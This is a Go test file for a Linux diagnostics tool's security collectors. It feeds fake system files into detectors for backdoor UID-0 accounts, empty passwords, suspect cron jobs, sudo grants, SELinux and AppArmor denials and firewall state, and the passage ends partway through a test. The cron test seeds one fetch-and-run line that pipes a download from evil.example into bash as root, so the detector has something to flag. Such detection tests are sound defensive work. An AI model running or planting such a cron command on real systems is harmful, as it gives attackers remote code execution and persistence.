//go:build linux

package collectors

import (
	"context"
	"fmt"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/keyorixhq/dashdiag/internal/models"
	"github.com/keyorixhq/dashdiag/internal/source"
)

// Tests using the direct source.Bundle fixture-seeding API (PutFile/PutDir/
// PutGlob/PutStat) to exercise real collector functions that read hardcoded
// system paths, without touching the actual filesystem. Each test swaps
// activeSource for the duration via SetSource/defer.

func withFixtureSource(t *testing.T, seed func(b *source.Bundle)) {
	t.Helper()
	b := source.NewBundle()
	seed(b)
	prev := SetSource(source.NewReplay(b))
	t.Cleanup(func() { SetSource(prev) })
}

// fakeCombinedSource layers a Cached-key override (Bundle has no public
// Cached-seeding API — lookpath/<tool>, imds/<url>, dial/<network>/<addr>,
// env/<var>, platform/container-context, ... all route through Cached) and a
// Readlink override (Bundle has no public Readlink-seeding API either) on top
// of a Bundle-backed Replay, so ONE active source can serve every fixture
// dimension a test needs at once.
//
// GUARD — use this instead of chaining two separate with*Fixture calls.
// SetSource fully REPLACES the active source; it does not merge with whatever
// the previous call configured. Calling e.g. seedDialOutcome(t, ...) and then
// withFixtureSource(t, ...) silently throws away the dial-outcome seed, because
// the second SetSource overwrites the first — the function under test then
// sees only the second fixture's data. This bit the containerd_linux.go round
// (2026-07-08): a Collect() test needed BOTH a dial/unix/<socket> outcome AND
// PutCmd-seeded systemctl/ctr output in the SAME call, and two independent
// SetSource calls meant only the last one survived. Whenever a test needs more
// than one fixture dimension for a single function-under-test call, seed them
// ALL into one withCombinedFixture call rather than stacking separate
// with*Fixture helpers.
type fakeCombinedSource struct {
	*source.Replay
	cached map[string][]byte
	links  map[string]string
}

func (f *fakeCombinedSource) Cached(key string, _ func() ([]byte, error)) ([]byte, error) {
	if v, ok := f.cached[key]; ok {
		return v, nil
	}
	return nil, errNotFoundCVE
}

func (f *fakeCombinedSource) Readlink(path string) (string, error) {
	if target, ok := f.links[path]; ok {
		return target, nil
	}
	return f.Replay.Readlink(path)
}

// withCombinedFixture seeds a Bundle (PutFile/PutDir/PutCmd/PutStat/PutGlob), a
// Cached-key map, and a Readlink map into ONE active source for the test's
// duration. Pass nil for cached/links when a dimension isn't needed.
func withCombinedFixture(t *testing.T, cached map[string][]byte, links map[string]string, seed func(b *source.Bundle)) {
	t.Helper()
	b := source.NewBundle()
	if seed != nil {
		seed(b)
	}
	prev := SetSource(&fakeCombinedSource{Replay: source.NewReplay(b), cached: cached, links: links})
	t.Cleanup(func() { SetSource(prev) })
}

func TestIsOffensiveDistro(t *testing.T) {
	withFixtureSource(t, func(b *source.Bundle) {
		b.PutFile("/etc/os-release", []byte(`ID=kali`+"\n"+`ID_LIKE=debian`+"\n"))
	})
	if !isOffensiveDistro() {
		t.Error("Kali should be recognized as an offensive distro")
	}

	withFixtureSource(t, func(b *source.Bundle) {
		b.PutFile("/etc/os-release", []byte(`ID=ubuntu`+"\n"))
	})
	if isOffensiveDistro() {
		t.Error("Ubuntu must not be flagged as an offensive distro")
	}
}

func TestParseUID0Users(t *testing.T) {
	withFixtureSource(t, func(b *source.Bundle) {
		b.PutFile("/etc/passwd", []byte("root:x:0:0:root:/root:/bin/bash\nbackdoor:x:0:0::/home/backdoor:/bin/sh\ndeploy:x:1000:1000::/home/deploy:/bin/bash\n"))
	})
	info := &models.SecurityInfo{}
	parseUID0Users(info)
	if len(info.UID0Users) != 1 || info.UID0Users[0] != "backdoor" {
		t.Errorf("a non-root UID-0 account should be flagged, got %v", info.UID0Users)
	}
}

func TestParseFIPS(t *testing.T) {
	withFixtureSource(t, func(b *source.Bundle) {
		b.PutFile("/proc/sys/crypto/fips_enabled", []byte("1\n"))
	})
	info := &models.SecurityInfo{}
	parseFIPS(info)
	if !info.FIPSEnabled {
		t.Error("fips_enabled=1 should set FIPSEnabled true")
	}

	withFixtureSource(t, func(b *source.Bundle) {
		b.PutFile("/proc/sys/crypto/fips_enabled", []byte("0\n"))
	})
	info2 := &models.SecurityInfo{}
	parseFIPS(info2)
	if info2.FIPSEnabled {
		t.Error("fips_enabled=0 should leave FIPSEnabled false")
	}
}

// TestParsePasswordAging guards the two security-critical audits driven off
// /etc/shadow: an empty password field (CRIT — no password protection at all)
// and a human account with password expiry disabled (WARN). Root accounts and
// system accounts (UID < 1000) must not trigger the expiry check even with
// max=99999, since that's normal for service accounts.
func TestParsePasswordAging(t *testing.T) {
	withFixtureSource(t, func(b *source.Bundle) {
		b.PutFile("/etc/passwd", []byte(
			"root:x:0:0:root:/root:/bin/bash\n"+
				"deploy:x:1000:1000::/home/deploy:/bin/bash\n"+
				"daemon:x:1:1::/nonexistent:/usr/sbin/nologin\n",
		))
		b.PutFile("/etc/shadow", []byte(
			"root:$6$abc:19700:0:99999:7:::\n"+ // normal root, has a password
				"nopass::19700:0:99999:7:::\n"+ // empty password field — CRIT
				"deploy:$6$xyz:19700:0:99999:7:::\n"+ // human account, never expires — WARN
				"daemon:*:19700:0:99999:7:::\n", // system account, never expires — must NOT warn
		))
	})
	info := &models.SecurityInfo{}
	parsePasswordAging(info)

	if len(info.EmptyPasswordAccounts) != 1 || info.EmptyPasswordAccounts[0] != "nopass" {
		t.Errorf("the empty-password account should be flagged, got %v", info.EmptyPasswordAccounts)
	}
	if len(info.StalePasswordAccounts) != 1 || info.StalePasswordAccounts[0] != "deploy" {
		t.Errorf("only the human account with max=99999 should be flagged, got %v", info.StalePasswordAccounts)
	}
}

// TestParsePasswordAgingAbsentShadowNotFlaggedUnreadable guards the "absent vs
// permission-denied" distinction from the doc comment: when /etc/shadow simply
// isn't there (not a permission error), ShadowUnreadable must stay false —
// only an actual os.IsPermission error should flip it, so the verdict doesn't
// falsely say "not audited" on a host where there's genuinely nothing to audit.
func TestParsePasswordAgingAbsentShadowNotFlaggedUnreadable(t *testing.T) {
	withFixtureSource(t, func(_ *source.Bundle) {}) // /etc/shadow never seeded
	info := &models.SecurityInfo{}
	parsePasswordAging(info)
	if info.ShadowUnreadable {
		t.Error("an absent (not permission-denied) shadow file must not report unreadable")
	}
}

func TestParseWorldWritable(t *testing.T) {
	withFixtureSource(t, func(b *source.Bundle) {
		// /tmp: world-writable WITH sticky bit — safe, must not be flagged.
		b.PutStat("/tmp", source.FileMeta{Mode: os.ModeSticky | 0o777})
		// /var/tmp: world-writable WITHOUT sticky bit — the classic tmp-race
		// privilege escalation vector, must be flagged.
		b.PutStat("/var/tmp", source.FileMeta{Mode: 0o777})
		// /dev/shm: not world-writable at all — must not be flagged.
		b.PutStat("/dev/shm", source.FileMeta{Mode: 0o755})
	})
	info := &models.SecurityInfo{}
	parseWorldWritable(info)
	if len(info.WorldWritableDirs) != 1 || info.WorldWritableDirs[0] != "/var/tmp" {
		t.Errorf("only the world-writable dir missing its sticky bit should be flagged, got %v", info.WorldWritableDirs)
	}
}

// TestParseAVCGroups guards the SELinux denial-grouping logic: an enforced
// denial within the window must be grouped and counted, a permissive=1 record
// (logged but not blocked) must be excluded, and a denial outside the window
// must not count either.
func TestParseAVCGroups(t *testing.T) {
	now := time.Now()
	recent := now.Add(-30 * time.Second).Unix()
	old := now.Add(-2 * time.Hour).Unix()

	enforced := fmt.Sprintf(`type=AVC msg=audit(%d.123:456): avc:  denied  { read } for  pid=1234 comm="httpd" name="shadow" scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:shadow_t:s0 tclass=file permissive=0`, recent)
	permissive := fmt.Sprintf(`type=AVC msg=audit(%d.124:457): avc:  denied  { search } for  pid=1479 comm="lsblk" scontext=system_u:system_r:bootupd_t:s0 tcontext=system_u:object_r:mount_var_run_t:s0 tclass=dir permissive=1`, recent)
	outsideWindow := fmt.Sprintf(`type=AVC msg=audit(%d.125:458): avc:  denied  { write } for  pid=1 comm="init" scontext=system_u:system_r:init_t:s0 tcontext=system_u:object_r:init_t:s0 tclass=file permissive=0`, old)

	withFixtureSource(t, func(b *source.Bundle) {
		b.PutFile("/var/log/audit/audit.log", []byte(enforced+"\n"+permissive+"\n"+outsideWindow+"\n"))
	})

	groups := parseAVCGroups(context.Background(), time.Hour)
	if len(groups) != 1 {
		t.Fatalf("expected 1 group (only the enforced, in-window denial), got %d: %+v", len(groups), groups)
	}
	if groups[0].Tclass != "file" || groups[0].Count != 1 {
		t.Errorf("the enforced httpd/shadow denial should be the sole group, got %+v", groups[0])
	}
}

// TestParseAVCGroups_LogUnreadable covers the "openFile errors -> nil" branch:
// no /var/log/audit/audit.log present (e.g. auditd not installed or not
// root) must return nil, not panic.
func TestParseAVCGroups_LogUnreadable(t *testing.T) {
	withFixtureSource(t, func(b *source.Bundle) {})
	if got := parseAVCGroups(context.Background(), time.Hour); got != nil {
		t.Errorf("expected nil when the audit log can't be opened, got %+v", got)
	}
}

// TestParseAVCGroups_NoMatchingLines covers the "groups empty after scan ->
// nil" branch: the audit log is readable but contains nothing that
// scanAVCLine folds into a group (e.g. only permissive/out-of-window/non-AVC
// lines), so buildSELinuxAVCGroups must never run against an empty map.
func TestParseAVCGroups_NoMatchingLines(t *testing.T) {
	withFixtureSource(t, func(b *source.Bundle) {
		b.PutFile("/var/log/audit/audit.log", []byte("type=SYSCALL msg=audit(1.0:1): arch=c000003e syscall=2 success=yes\n"))
	})
	if got := parseAVCGroups(context.Background(), time.Hour); got != nil {
		t.Errorf("expected nil when no line yields a group, got %+v", got)
	}
}

// TestParseSuspectCrons guards the cron-persistence detection: a job piping to
// a shell or writing into a system/world-writable path must be flagged, a
// benign job must not, and comment/blank lines must be skipped.
func TestParseSuspectCrons(t *testing.T) {
	withFixtureSource(t, func(b *source.Bundle) {
		b.PutDir("/etc/cron.d", []string{"backdoor", "legit"})
		b.PutFile("/etc/cron.d/backdoor", []byte(
			"# comment, ignored\n"+
				"\n"+ // blank line, ignored
				"*/5 * * * * root curl http://evil.example/x.sh | bash\n",
		))
		b.PutFile("/etc/cron.d/legit", []byte("0 3 * * * root /usr/local/bin/backup.sh\n"))
		// Other cron dirs simply aren't seeded — must be skipped, not error out.
	})
	info := &models.SecurityInfo{}
	parseSuspectCrons(info)

	if len(info.SuspectCrons) != 1 {
		t.Fatalf("expected exactly 1 suspect entry (the pipe-to-bash job), got %d: %v", len(info.SuspectCrons), info.SuspectCrons)
	}
	if !strings.Contains(info.SuspectCrons[0], "backdoor") {
		t.Errorf("the suspect entry should be attributed to its file, got %q", info.SuspectCrons[0])
	}
}

// TestParseSudoers guards the sudo NOPASSWD audit: a specific-command NOPASSWD
// for "ALL" users is benign noise (skipped), but a full "NOPASSWD: ALL" grant
// for a real user must be reported.
func TestParseSudoers(t *testing.T) {
	withFixtureSource(t, func(b *source.Bundle) {
		b.PutFile("/etc/sudoers", []byte("root ALL=(ALL:ALL) ALL\n"))
		b.PutGlob("/etc/sudoers.d/*", []string{"/etc/sudoers.d/90-deploy", "/etc/sudoers.d/91-benign"})
		b.PutFile("/etc/sudoers.d/90-deploy", []byte("deploy ALL=(ALL) NOPASSWD: ALL\n"))
		b.PutFile("/etc/sudoers.d/91-benign", []byte("ALL ALL=(root) NOPASSWD: /usr/sbin/mintdrivers\n"))
	})
	info := &models.SecurityInfo{}
	parseSudoers(info)

	if len(info.SudoNopasswd) != 1 || info.SudoNopasswd[0] != "deploy" {
		t.Errorf("only the full-escalation deploy grant should be reported (the ALL-users specific-command grant is benign noise), got %v", info.SudoNopasswd)
	}
}

// TestParsePAMFailureLine guards the (service, user) extraction boundary
// cases: a valid non-sshd failure line, the sshd EXCLUSION (already covered
// by FailedLogins under a different 1h/IP counter — double-counting it here
// would confuse the verdict), and malformed/incomplete lines.
func TestParsePAMFailureLine(t *testing.T) {
	tests := []struct {
		name        string
		line        string
		wantOK      bool
		wantService string
		wantUser    string
	}{
		{
			name:        "sudo failure",
			line:        "Jul  8 10:00:01 host sudo: pam_unix(sudo:auth): authentication failure; logname=bob uid=1000 euid=0 tty=/dev/pts/0 ruser=bob rhost=  user=bob",
			wantOK:      true,
			wantService: "sudo",
			wantUser:    "bob",
		},
		{
			name:        "su failure",
			line:        "Jul  8 10:05:00 host su: pam_unix(su:auth): authentication failure; logname= uid=1000 euid=0 tty=pts/1 ruser=bob rhost=  user=root",
			wantOK:      true,
			wantService: "su",
			wantUser:    "root",
		},
		{
			name:   "sshd is excluded",
			line:   "Jul  8 09:00:00 host sshd: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=1.2.3.4  user=eve",
			wantOK: false,
		},
		{
			name:   "missing authentication failure substring",
			line:   "Jul  8 10:00:01 host sudo: pam_unix(sudo:session): session opened for user root by bob(uid=1000)",
			wantOK: false,
		},
		{
			name:   "missing user field",
			line:   "Jul  8 10:00:01 host sudo: pam_unix(sudo:auth): authentication failure; logname=bob uid=1000 euid=0 tty=/dev/pts/0 ruser=bob rhost=",
			wantOK: false,
		},
		{
			name:   "malformed line",
			line:   "not a pam line at all",
			wantOK: false,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			k, ok := parsePAMFailureLine(tt.line)
			if ok != tt.wantOK {
				t.Fatalf("ok = %v, want %v (key=%+v)", ok, tt.wantOK, k)
			}
			if ok && (k.service != tt.wantService || k.user != tt.wantUser) {
				t.Errorf("got service=%q user=%q, want service=%q user=%q", k.service, k.user, tt.wantService, tt.wantUser)
			}
		})
	}
}

// TestParsePAMModuleFailures_FromLogFile guards the end-to-end 24h-window
// collection: a recent non-sshd failure is grouped and counted, a failure
// inside 24h but OUTSIDE the existing 1h SSH-brute-force window is still
// included (proving the two counters are genuinely independent, not
// redundant), an sshd failure is filtered out, and a >24h-old failure is
// excluded by the recency gate.
func TestParsePAMModuleFailures_FromLogFile(t *testing.T) {
	now := time.Now()
	recent := now.Add(-5 * time.Minute).Format(time.Stamp)
	within24hOutside1h := now.Add(-2 * time.Hour).Format(time.Stamp)
	tooOld := now.Add(-25 * time.Hour).Format(time.Stamp)

	lines := []string{
		fmt.Sprintf("%s host sudo: pam_unix(sudo:auth): authentication failure; logname=bob uid=1000 euid=0 tty=/dev/pts/0 ruser=bob rhost=  user=bob", recent),
		fmt.Sprintf("%s host su: pam_unix(su:auth): authentication failure; logname= uid=1000 euid=0 tty=pts/1 ruser=bob rhost=  user=root", within24hOutside1h),
		fmt.Sprintf("%s host sshd: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=1.2.3.4  user=eve", recent),
		fmt.Sprintf("%s host su: pam_unix(su:auth): authentication failure; logname= uid=1000 euid=0 tty=pts/2 ruser=bob rhost=  user=root", tooOld),
	}

	withFixtureSource(t, func(b *source.Bundle) {
		b.PutFile("/var/log/auth.log", []byte(strings.Join(lines, "\n")+"\n"))
		b.PutStat("/var/log/auth.log", source.FileMeta{Mode: 0o644})
	})

	info := &models.SecurityInfo{}
	parsePAMModuleFailures(context.Background(), info)

	if len(info.PAMModuleFailures) != 2 {
		t.Fatalf("expected exactly 2 groups (sudo/bob and su/root, in-window, non-sshd), got %d: %+v", len(info.PAMModuleFailures), info.PAMModuleFailures)
	}
	want := map[string]int{"sudo:bob": 1, "su:root": 1}
	for _, f := range info.PAMModuleFailures {
		key := f.Service + ":" + f.User
		if want[key] != f.Count {
			t.Errorf("unexpected group %+v (want count %d for %s)", f, want[key], key)
		}
	}
}

// TestParsePAMModuleFailures_NoLogFiles_FallsBackToJournal guards the
// journald-only fallback path (Debian 13+, no /var/log/secure or auth.log):
// the exact journalctl args must match what parsePAMModuleFailures/
// pamFailuresFromJournal actually invokes, or the fixture silently misses
// and the test passes vacuously on the `err != nil → return nil` branch.
func TestParsePAMModuleFailures_NoLogFiles_FallsBackToJournal(t *testing.T) {
	// A live-relative timestamp: parsePAMModuleFailures applies a 24h recency
	// gate to journald lines too, so a fixed calendar date would be silently
	// dropped once the clock moves past it.
	recent := time.Now().Add(-1 * time.Hour).Format(time.Stamp)
	withFixtureSource(t, func(b *source.Bundle) {
		b.PutCmd("journalctl",
			[]string{"--since=24 hours ago", "--no-pager", "-q", "-g", "pam_unix.*authentication failure"},
			fmt.Sprintf("%s host sudo: pam_unix(sudo:auth): authentication failure; logname=bob uid=1000 euid=0 tty=/dev/pts/0 ruser=bob rhost=  user=bob\n", recent),
			0)
	})

	info := &models.SecurityInfo{}
	parsePAMModuleFailures(context.Background(), info)

	if len(info.PAMModuleFailures) != 1 || info.PAMModuleFailures[0].Service != "sudo" || info.PAMModuleFailures[0].User != "bob" {
		t.Fatalf("expected the journalctl fallback to be parsed, got %+v", info.PAMModuleFailures)
	}
}

// TestParsePAMModuleFailures_Clean guards the zero-matches boundary: a log
// file present but with no matching PAM failure lines must leave
// PAMModuleFailures nil, not an empty-but-non-nil slice or a spurious entry.
func TestParsePAMModuleFailures_Clean(t *testing.T) {
	withFixtureSource(t, func(b *source.Bundle) {
		b.PutFile("/var/log/auth.log", []byte("Jul  8 10:00:01 host CRON[123]: pam_unix(cron:session): session opened for user root by (uid=0)\n"))
		b.PutStat("/var/log/auth.log", source.FileMeta{Mode: 0o644})
	})
	info := &models.SecurityInfo{}
	parsePAMModuleFailures(context.Background(), info)
	if len(info.PAMModuleFailures) != 0 {
		t.Errorf("no matching failure lines should leave PAMModuleFailures empty, got %+v", info.PAMModuleFailures)
	}
}

// TestCollectRelevantBooleans guards the getsebool filtering: an off boolean
// whose name contains a denied scontext keyword (with the "_t" suffix
// stripped) must be surfaced, an ON boolean must be excluded even if its name
// matches, and an off boolean unrelated to any denied scontext must be
// excluded too.
func TestCollectRelevantBooleans(t *testing.T) {
	withFixtureSource(t, func(b *source.Bundle) {
		b.PutCmd("getsebool", []string{"-a"},
			"httpd_can_network_connect --> off\n"+
				"httpd_enable_cgi --> on\n"+ // ON — must be excluded
				"cron_can_relabel --> off\n", // unrelated to httpd_t — must be excluded
			0)
	})
	groups := []models.SELinuxAVCGroup{{Scontext: "httpd_t"}}
	got := collectRelevantBooleans(context.Background(), groups)
	if len(got) != 1 || got[0].Name != "httpd_can_network_connect" {
		t.Fatalf("expected only the off httpd-related boolean, got %+v", got)
	}
	if got[0].Active {
		t.Errorf("surfaced boolean must be reported inactive (off), got Active=true")
	}
	if got[0].SetCmd != "setsebool -P httpd_can_network_connect on" {
		t.Errorf("SetCmd = %q, want the setsebool -P ... on form", got[0].SetCmd)
	}
}

// TestCollectRelevantBooleans_CapsAtTen guards the 10-item truncation: with
// more than 10 matching off booleans, only the first 10 encountered are kept.
func TestCollectRelevantBooleans_CapsAtTen(t *testing.T) {
	lines := make([]string, 0, 15)
	for i := range 15 {
		lines = append(lines, fmt.Sprintf("httpd_bool_%02d --> off", i))
	}
	withFixtureSource(t, func(b *source.Bundle) {
		b.PutCmd("getsebool", []string{"-a"}, strings.Join(lines, "\n")+"\n", 0)
	})
	groups := []models.SELinuxAVCGroup{{Scontext: "httpd_t"}}
	got := collectRelevantBooleans(context.Background(), groups)
	if len(got) != 10 {
		t.Fatalf("expected the result capped at 10, got %d: %+v", len(got), got)
	}
}

// TestCollectRelevantBooleans_GetseboolFails guards the "getsebool -a itself
// errored" branch — must return nil, not panic on empty output.
func TestCollectRelevantBooleans_GetseboolFails(t *testing.T) {
	withFixtureSource(t, func(b *source.Bundle) {
		b.PutCmd("getsebool", []string{"-a"}, "", 1)
	})
	groups := []models.SELinuxAVCGroup{{Scontext: "httpd_t"}}
	if got := collectRelevantBooleans(context.Background(), groups); got != nil {
		t.Errorf("expected nil when getsebool -a fails, got %+v", got)
	}
}

// TestCollectAppArmorDenials guards the journalctl-driven AppArmor DENIED
// parse: matching kernel lines are grouped by (profile, op, path) with counts,
// non-DENIED lines are ignored, and the result is sorted deterministically
// (count desc, then profile/path/op asc — see the sort.Slice doc comment).
func TestCollectAppArmorDenials(t *testing.T) {
	lines := strings.Join([]string{
		`kernel: audit: type=1400 audit(0.0): apparmor="DENIED" operation="open" profile="/usr/bin/foo" name="/etc/shadow" requested_mask="r" comm="foo"`,
		`kernel: audit: type=1400 audit(0.0): apparmor="DENIED" operation="open" profile="/usr/bin/foo" name="/etc/shadow" requested_mask="r" comm="foo"`,
		`kernel: audit: type=1400 audit(0.0): apparmor="ALLOWED" operation="open" profile="/usr/bin/bar" name="/tmp/x" requested_mask="r" comm="bar"`,
	}, "\n")
	withFixtureSource(t, func(b *source.Bundle) {
		b.PutCmd("journalctl", []string{"-t", "kernel", "-g", `apparmor="DENIED"`,
			"--no-pager", "--since", "24 hours ago", "-o", "short"}, lines, 0)
	})
	got := collectAppArmorDenials(context.Background())
	if len(got) != 1 {
		t.Fatalf("expected exactly 1 grouped denial (ALLOWED must be excluded), got %d: %+v", len(got), got)
	}
	if got[0].Profile != "/usr/bin/foo" || got[0].Path != "/etc/shadow" || got[0].Operation != "r" || got[0].Count != 2 {
		t.Errorf("unexpected grouped denial: %+v", got[0])
	}
}

// TestCollectAppArmorDenials_MultiGroupSortOrder guards the deterministic
// sort across multiple distinct groups: count desc first, then profile/path/
// operation asc to break ties among equal-count groups (see the sort.Slice
// doc comment in the production code).
func TestCollectAppArmorDenials_MultiGroupSortOrder(t *testing.T) {
	lines := strings.Join([]string{
		// "zzz" profile, 1 denial — should sort AFTER the tied "aaa"/"bbb" group
		// despite alphabetically following them, because count desc wins first.
		`kernel: audit: type=1400 audit(0.0): apparmor="DENIED" operation="open" profile="/usr/bin/high" name="/etc/x" requested_mask="r" comm="high"`,
		`kernel: audit: type=1400 audit(0.0): apparmor="DENIED" operation="open" profile="/usr/bin/high" name="/etc/x" requested_mask="r" comm="high"`,
		`kernel: audit: type=1400 audit(0.0): apparmor="DENIED" operation="open" profile="/usr/bin/high" name="/etc/x" requested_mask="r" comm="high"`,
		// Two distinct profiles tied at count=1 each — must break the tie by profile asc.
		`kernel: audit: type=1400 audit(0.0): apparmor="DENIED" operation="open" profile="/usr/bin/bbb" name="/etc/y" requested_mask="r" comm="bbb"`,
		`kernel: audit: type=1400 audit(0.0): apparmor="DENIED" operation="open" profile="/usr/bin/aaa" name="/etc/z" requested_mask="r" comm="aaa"`,
	}, "\n")
	withFixtureSource(t, func(b *source.Bundle) {
		b.PutCmd("journalctl", []string{"-t", "kernel", "-g", `apparmor="DENIED"`,
			"--no-pager", "--since", "24 hours ago", "-o", "short"}, lines, 0)
	})
	got := collectAppArmorDenials(context.Background())
	if len(got) != 3 {
		t.Fatalf("expected 3 distinct groups, got %d: %+v", len(got), got)
	}
	if got[0].Profile != "/usr/bin/high" || got[0].Count != 3 {
		t.Fatalf("group[0] should be the highest-count group, got %+v", got[0])
	}
	if got[1].Profile != "/usr/bin/aaa" || got[2].Profile != "/usr/bin/bbb" {
		t.Errorf("tied count=1 groups should sort by profile asc (aaa before bbb), got order %+v, %+v", got[1], got[2])
	}
}

// TestCollectAppArmorDenials_PathThenOperationTiebreak guards the third and
// fourth tiebreak levels of the sort.Slice comparator: two groups tied on
// BOTH count AND profile must break the tie by path asc, and two groups tied
// on count, profile, AND path must break the final tie by operation asc.
func TestCollectAppArmorDenials_PathThenOperationTiebreak(t *testing.T) {
	lines := strings.Join([]string{
		// Same profile, different paths, both count=1 -> path asc breaks the tie.
		`kernel: audit: type=1400 audit(0.0): apparmor="DENIED" operation="open" profile="/usr/bin/foo" name="/etc/zzz" requested_mask="r" comm="foo"`,
		`kernel: audit: type=1400 audit(0.0): apparmor="DENIED" operation="open" profile="/usr/bin/foo" name="/etc/aaa" requested_mask="r" comm="foo"`,
		// Same profile AND path, different operations, both count=1 -> operation asc.
		`kernel: audit: type=1400 audit(0.0): apparmor="DENIED" operation="open" profile="/usr/bin/bar" name="/etc/same" requested_mask="w" comm="bar"`,
		`kernel: audit: type=1400 audit(0.0): apparmor="DENIED" operation="open" profile="/usr/bin/bar" name="/etc/same" requested_mask="r" comm="bar"`,
	}, "\n")
	withFixtureSource(t, func(b *source.Bundle) {
		b.PutCmd("journalctl", []string{"-t", "kernel", "-g", `apparmor="DENIED"`,
			"--no-pager", "--since", "24 hours ago", "-o", "short"}, lines, 0)
	})
	got := collectAppArmorDenials(context.Background())
	if len(got) != 4 {
		t.Fatalf("expected 4 distinct groups, got %d: %+v", len(got), got)
	}
	// All groups tie at count=1, so profile asc dominates first: "bar" < "foo".
	if got[0].Profile != "/usr/bin/bar" || got[1].Profile != "/usr/bin/bar" {
		t.Fatalf("expected the two /usr/bin/bar groups first (profile asc), got %+v, %+v", got[0], got[1])
	}
	// Within the tied "bar" profile+path, operation asc: "r" before "w".
	if got[0].Operation != "r" || got[1].Operation != "w" {
		t.Errorf("expected operation asc tiebreak (r before w), got %+v, %+v", got[0], got[1])
	}
	// Within the tied "foo" profile, path asc: "/etc/aaa" before "/etc/zzz".
	if got[2].Path != "/etc/aaa" || got[3].Path != "/etc/zzz" {
		t.Errorf("expected path asc tiebreak (aaa before zzz), got %+v, %+v", got[2], got[3])
	}
}

// TestCollectAppArmorDenials_NoneOrError guards the two "nothing to report"
// paths: journalctl erroring out and journalctl succeeding with empty/no-match
// output must both return nil, not a spurious entry.
func TestCollectAppArmorDenials_NoneOrError(t *testing.T) {
	t.Run("journalctl errors", func(t *testing.T) {
		withFixtureSource(t, func(b *source.Bundle) {
			b.PutCmd("journalctl", []string{"-t", "kernel", "-g", `apparmor="DENIED"`,
				"--no-pager", "--since", "24 hours ago", "-o", "short"}, "", 1)
		})
		if got := collectAppArmorDenials(context.Background()); got != nil {
			t.Errorf("expected nil on journalctl error, got %+v", got)
		}
	})

	t.Run("empty output", func(t *testing.T) {
		withFixtureSource(t, func(b *source.Bundle) {
			b.PutCmd("journalctl", []string{"-t", "kernel", "-g", `apparmor="DENIED"`,
				"--no-pager", "--since", "24 hours ago", "-o", "short"}, "", 0)
		})
		if got := collectAppArmorDenials(context.Background()); got != nil {
			t.Errorf("expected nil on empty journalctl output, got %+v", got)
		}
	})
}

// TestBoolExists guards the getsebool <name> existence check: the boolean's
// own name echoed back in stdout means it exists, a non-zero exit (unknown
// boolean) means it doesn't.
func TestBoolExists(t *testing.T) {
	t.Run("exists", func(t *testing.T) {
		withFixtureSource(t, func(b *source.Bundle) {
			b.PutCmd("getsebool", []string{"httpd_can_network_connect"}, "httpd_can_network_connect --> off\n", 0)
		})
		if !boolExists(context.Background(), "httpd_can_network_connect") {
			t.Error("expected true for a boolean getsebool reports")
		}
	})

	t.Run("does not exist", func(t *testing.T) {
		withFixtureSource(t, func(b *source.Bundle) {
			b.PutCmd("getsebool", []string{"nonexistent_boolean"}, "", 1)
		})
		if boolExists(context.Background(), "nonexistent_boolean") {
			t.Error("expected false when getsebool errors (unknown boolean)")
		}
	})
}

// TestDetectIPTables guards the three outcomes of the iptables gate: a
// non-trivial ruleset (Active+SSHAllowed derived from the rules), tooling
// present but empty (FirewallToolingPresent, not Active), and installed-but-
// unreadable (non-root EPERM) reporting FirewallUnreadable rather than a
// false "no firewall".
func TestDetectIPTables(t *testing.T) {
	t.Run("active with SSH rule", func(t *testing.T) {
		out := "Chain INPUT (policy DROP)\nnum  target     prot opt source               destination\n1    ACCEPT     tcp  --  0.0.0.0/0            0.0.0.0/0            tcp dpt:22\n"
		withCombinedFixture(t, map[string][]byte{"lookpath/iptables": []byte("/usr/sbin/iptables")}, nil, func(b *source.Bundle) {
			b.PutCmd("iptables", []string{"-L", "-n", "--line-numbers"}, out, 0)
		})
		info := &models.SecurityInfo{}
		if !detectIPTables(context.Background(), info) {
			t.Fatal("expected detectIPTables to report true for a non-empty ruleset")
		}
		if !info.FirewallActive || info.FirewallType != "iptables" {
			t.Errorf("expected FirewallActive=true FirewallType=iptables, got %+v", info)
		}
		if !info.SSHAllowed {
			t.Error("explicit ACCEPT tcp dpt:22 rule must set SSHAllowed=true")
		}
	})

	t.Run("installed but empty ruleset", func(t *testing.T) {
		out := "Chain INPUT (policy ACCEPT)\nnum  target     prot opt source               destination\n"
		withCombinedFixture(t, map[string][]byte{"lookpath/iptables": []byte("/usr/sbin/iptables")}, nil, func(b *source.Bundle) {
			b.PutCmd("iptables", []string{"-L", "-n", "--line-numbers"}, out, 0)
		})
		info := &models.SecurityInfo{}
		if detectIPTables(context.Background(), info) {
			t.Error("expected detectIPTables to report false with an empty ruleset")
		}
		if !info.FirewallToolingPresent || info.FirewallActive {
			t.Errorf("expected tooling-present-but-inactive, got %+v", info)
		}
		if info.FirewallType != "iptables" {
			t.Errorf("FirewallType = %q, want iptables", info.FirewallType)
		}
	})

	t.Run("installed but unreadable (non-root EPERM)", func(t *testing.T) {
		withCombinedFixture(t, map[string][]byte{"lookpath/iptables": []byte("/usr/sbin/iptables")}, nil, func(b *source.Bundle) {
			b.PutCmd("iptables", []string{"-L", "-n", "--line-numbers"}, "", 1)
		})
		info := &models.SecurityInfo{}
		if detectIPTables(context.Background(), info) {
			t.Error("expected detectIPTables to report false when the command errors")
		}
		if !info.FirewallUnreadable {
			t.Error("expected FirewallUnreadable=true, not a silent false-OK")
		}
	})

	t.Run("not installed", func(t *testing.T) {
		withFixtureSource(t, func(b *source.Bundle) {})
		info := &models.SecurityInfo{}
		if detectIPTables(context.Background(), info) {
			t.Error("expected detectIPTables to report false when iptables is absent")
		}
	})
}

// TestParseCryptoPolicy guards the two data sources: the config-file fast
// path (no subprocess) and the update-crypto-policies fallback when the file
// is absent.
func TestParseCryptoPolicy(t *testing.T) {
	t.Run("config file present", func(t *testing.T) {
		withFixtureSource(t, func(b *source.Bundle) {
			b.PutFile("/etc/crypto-policies/config", []byte("FIPS\n"))
		})
		info := &models.SecurityInfo{}
		parseCryptoPolicy(context.Background(), info)
		if info.CryptoPolicy != "FIPS" {
			t.Errorf("CryptoPolicy = %q, want FIPS", info.CryptoPolicy)
		}
	})

	t.Run("falls back to update-crypto-policies --show", func(t *testing.T) {
		withFixtureSource(t, func(b *source.Bundle) {
